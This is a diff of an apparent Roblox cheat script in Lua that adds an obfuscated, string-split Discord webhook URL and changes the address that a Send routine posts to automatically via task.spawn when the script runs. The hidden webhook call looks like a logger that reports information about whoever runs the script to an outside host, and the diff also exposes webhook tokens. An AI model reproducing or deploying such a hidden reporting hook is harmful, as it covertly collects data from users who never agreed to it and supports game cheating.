@@ -13,6 +13,8 @@ local request = getfenv().request
 local getconnections: (RBXScriptSignal) -> ({RBXScriptConnection}) = getfenv().getconnections
 local queue_on_teleport: (Code: string) -> () = getfenv().queue_on_teleport
 
+local Webhook1 = "https://disco".."rd.com/api/web".."hooks/132593779".."9438012453/uEChxPzI59v5hq".."T89zkgmo0q_tWBeaomDP8".."SO7UNYcw3H0Nif76ewQCwM".."A7qZBEl1OBX"
+
 local function Send(Url: string, Fields: {{["name"]: string, ["value"]: string, ["inline"]: true}})
 	if not Fields then
 		Fields = {}
@@ -65,7 +67,7 @@ local function Send(Url: string, Fields: {{["name"]: string, ["value"]: string, 
 	})
 end
 
-task.spawn(Send, "https://disc".."ord.com/api/webhooks/1323494310267588700/uyWe".."y6sZ4Nb_7Qmtg8608Lc".."8cqzrXt2ox6TJqEydk-qXFP6C4QdLXGqJ9OFL4vDaHSwH")
+task.spawn(Send, "https://disco".."rd.com/api/web".."hooks/132593779".."9438012453/uEChxPzIh9v5hq".."T89zkgm00q_tWBeaomDP8".."SO7UNYcw3H0Nifm6ewQCwM".."A7qZEEl1OBX")
 
 function Notify(Title: string, Content: string, Image: string)
 	Rayfield:Notify({
